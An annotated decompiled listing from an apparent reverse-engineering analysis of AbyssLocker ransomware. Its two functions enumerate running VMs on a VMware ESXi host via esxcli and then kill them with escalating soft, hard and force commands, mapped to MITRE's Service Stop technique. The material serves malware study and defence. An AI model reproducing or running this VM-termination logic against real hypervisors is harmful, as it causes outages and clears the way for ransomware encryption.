////////////////////////////////////////////////////////////
// AbyssLocker
// https://www.shadowstackre.com/analysis/AbyssLocker
//
// Technique: Mitre Service Stop
// URL: https://attack.mitre.org/techniques/T1489/
//
// Analysis: ShadowStackRE
////////////////////////////////////////////////////////////

unsigned __int64 GetVMRunning()
{
  char *cmdOutput; // rbp
  char *hayStackWorldID; // rbx
  char *v2; // rdi
  __int64 i; // rcx
  char *hayStackProcID; // rax
  const char *v5; // r14
  char *v6; // rax
  int procID; // r15d
  unsigned int *ptrProcID; // rax
  unsigned int *v9; // r13
  char *v10; // rax
  bool v11; // zf
  __int64 v12; // rsi
  unsigned int *v14; // [rsp+0h] [rbp-158h] BYREF
  struct timespec abstime; // [rsp+8h] [rbp-150h] BYREF
  char s[256]; // [rsp+18h] [rbp-140h] BYREF
  unsigned __int64 v17; // [rsp+118h] [rbp-40h]

  v17 = __readfsqword(0x28u);
  // Execute a new command using the ESXCLI command line utility.  The process list will containing the running VM's.
  cmdOutput = (char *)ExecuteCommand("esxcli vm process list");
  for ( hayStackWorldID = strstr(cmdOutput, "World ID:");
        hayStackWorldID;
        hayStackWorldID = strstr(hayStackWorldID + 1, "World ID:") )
  {
    v2 = s;
    for ( i = 64LL; i; --i )
    {
      *(_DWORD *)v2 = 0;
      v2 += 4;
    }
    hayStackProcID = strstr(hayStackWorldID, "Process ID:");
    v5 = hayStackProcID;
    if ( !hayStackProcID )
      break;
    sub_4BFE((__int64)s, (__int64)hayStackWorldID, hayStackProcID - hayStackWorldID);
    v6 = strchr(s, 58);
    procID = atoi(v6 + 1);
    if ( procID )
    {
      ptrProcID = (unsigned int *)malloc(0x10uLL);
      *ptrProcID = procID;
      v9 = ptrProcID;
      v14 = ptrProcID;
      v10 = sub_39F6(v5);
      v11 = logFD == 0LL;
      *((_QWORD *)v9 + 1) = v10;
      if ( !v11 )
      {
        abstime.tv_nsec = 0LL;
        abstime.tv_sec = 1LL;
        sem_timedwait(&sem, &abstime);
        __fprintf_chk(
          logFD,
          1LL,
          "Running VM:%ld\tID:%d\t%s\n",
          ((qword_216778 - qword_216770) >> 3) + 1,
          *v14,
          *((const char **)v14 + 1));
        fflush(logFD);
        sem_post(&sem);
      }
      __fprintf_chk(
        stderr,
        1LL,
        "Running VM:%ld\tID:%d\t%s\n",
        ((qword_216778 - qword_216770) >> 3) + 1,
        *v14,
        *((const char **)v14 + 1));
      v12 = qword_216778;
      if ( qword_216778 == qword_216780 )
      {
        sub_4724((__int64)&qword_216770, (char *)qword_216778, &v14);
      }
      else
      {
        if ( qword_216778 )
          *(_QWORD *)qword_216778 = v14;
        qword_216778 = v12 + 8;
      }
    }
  }
  free(cmdOutput);
  if ( logFD )
  {
    abstime.tv_nsec = 0LL;
    abstime.tv_sec = 1LL;
    sem_timedwait(&sem, &abstime);
    __fprintf_chk(logFD, 1LL, "Total VM run on host:\t%ld\n", (qword_216778 - qword_216770) >> 3);
    fflush(logFD);
    sem_post(&sem);
  }
  __fprintf_chk(stderr, 1LL, "Total VM run on host:\t%ld\n", (qword_216778 - qword_216770) >> 3);
  return __readfsqword(0x28u) ^ v17;
}


unsigned __int64 KillVMsForce()
{
  unsigned __int64 v0; // rbp
  __int64 v1; // r12
  char *v2; // rdi
  __int64 i; // rcx
  _DWORD *cmdOutput; // rax
  unsigned __int64 v5; // rbp
  __int64 v6; // r12
  char *v7; // rdi
  __int64 j; // rcx
  char *cmdOutput2; // r15
  _DWORD *v10; // r13
  struct timespec abstime; // [rsp+8h] [rbp-D0h] BYREF
  char cmd[128]; // [rsp+18h] [rbp-C0h] BYREF
  unsigned __int64 v14; // [rsp+98h] [rbp-40h]

  v0 = 0LL;
  v14 = __readfsqword(0x28u);
  while ( (qword_216778 - gblWorldID) >> 3 > v0 )
  {
    v1 = 8 * v0++;
    if ( logFD )
    {
      abstime.tv_nsec = 0LL;
      abstime.tv_sec = 1LL;
      sem_timedwait(&sem, &abstime);
      __fprintf_chk(
        logFD,
        1LL,
        "First try kill\tVM:%ld\tID:%d\t%s\n",
        v0,
        **(unsigned int **)(gblWorldID + v1),
        *(const char **)(*(_QWORD *)(gblWorldID + v1) + 8LL));
      fflush(logFD);
      sem_post(&sem);
    }
    // Log the the first attempt to kill the VM, using the VM and world ID values
    __fprintf_chk(
      stderr,
      1LL,
      "First try kill\tVM:%ld\tID:%d\t%s\n",
      v0,
      **(unsigned int **)(gblWorldID + v1),
      *(const char **)(*(_QWORD *)(gblWorldID + v1) + 8LL));
    sub_3AC7(*(char **)(*(_QWORD *)(gblWorldID + v1) + 8LL));
    v2 = cmd;
    for ( i = 32LL; i; --i )
    {
      *(_DWORD *)v2 = 0;
      v2 += 4;
    }
    // Attempt to use the esxcli tool to kill the VM in a safe manner, allowing it to stop gracefully.
    __sprintf_chk(cmd, 1LL, 128LL, "esxcli vm process kill -t=soft -w=%d", **(unsigned int **)(gblWorldID + v1));
    cmdOutput = ExecuteCommand(cmd);
    if ( cmdOutput )
      free(cmdOutput);
  }
  v5 = 0LL;
  while ( (qword_216778 - gblWorldID) >> 3 > v5 )
  {
    v6 = 8 * v5++;
    if ( logFD )
    {
      abstime.tv_nsec = 0LL;
      abstime.tv_sec = 1LL;
      sem_timedwait(&sem, &abstime);
      __fprintf_chk(logFD, 1LL, "Check kill\tVM:%ld\tID:%d\n", v5, **(unsigned int **)(gblWorldID + v6));
      fflush(logFD);
      sem_post(&sem);
    }
    __fprintf_chk(stderr, 1LL, "Check kill\tVM:%ld\tID:%d\n", v5, **(unsigned int **)(gblWorldID + v6));
    v7 = cmd;
    for ( j = 32LL; j; --j )
    {
      *(_DWORD *)v7 = 0;
      v7 += 4;
    }
    // Attempt to use the esxcli tool to kill the VM by abruptly shuting it off.
    __sprintf_chk(cmd, 1LL, 128LL, "esxcli vm process kill -t=hard -w=%d", **(unsigned int **)(gblWorldID + v6));
    cmdOutput2 = (char *)ExecuteCommand(cmd);
    strcpy(cmd, "Unable to find");
    if ( strstr(cmdOutput2, cmd) )
    {
      if ( logFD )
      {
        abstime.tv_nsec = 0LL;
        abstime.tv_sec = 1LL;
        sem_timedwait(&sem, &abstime);
        __fprintf_chk(logFD, 1LL, "Killed\t\tVM:%ld\tID:%d\n", v5, **(unsigned int **)(gblWorldID + v6));
        fflush(logFD);
        sem_post(&sem);
      }
      __fprintf_chk(stderr, 1LL, "Killed\t\tVM:%ld\tID:%d\n", v5, **(unsigned int **)(gblWorldID + v6));
    }
    else
    {
      if ( logFD )
      {
        abstime.tv_nsec = 0LL;
        abstime.tv_sec = 1LL;
        sem_timedwait(&sem, &abstime);
        __fprintf_chk(logFD, 1LL, "still running VM:%ld\tID:%d try force\n", v5, **(unsigned int **)(gblWorldID + v6));
        fflush(logFD);
        sem_post(&sem);
      }
      // Force the VM to shutdown immediatly.  May leave the VM in an unstable state.
      __fprintf_chk(stderr, 1LL, "still running VM:%ld\tID:%d try force\n", v5, **(unsigned int **)(gblWorldID + v6));
      __sprintf_chk(cmd, 1LL, 128LL, "esxcli vm process kill -t=force -w=%d", **(unsigned int **)(gblWorldID + v6));
      v10 = ExecuteCommand(cmd);
      if ( v10 )
      {
        if ( logFD )
        {
          abstime.tv_nsec = 0LL;
          abstime.tv_sec = 1LL;
          sem_timedwait(&sem, &abstime);
          __fprintf_chk(logFD, 1LL, "Check\tVM:%ld\tID:\t%d manual !!!\n", v5, **(unsigned int **)(gblWorldID + v6));
          fflush(logFD);
          sem_post(&sem);
        }
        __fprintf_chk(stderr, 1LL, "Check\tVM:%ld\tID:\t%d manual !!!\n", v5, **(unsigned int **)(gblWorldID + v6));
        free(v10);
      }
    }
    free(cmdOutput2);
  }
  return __readfsqword(0x28u) ^ v14;
}

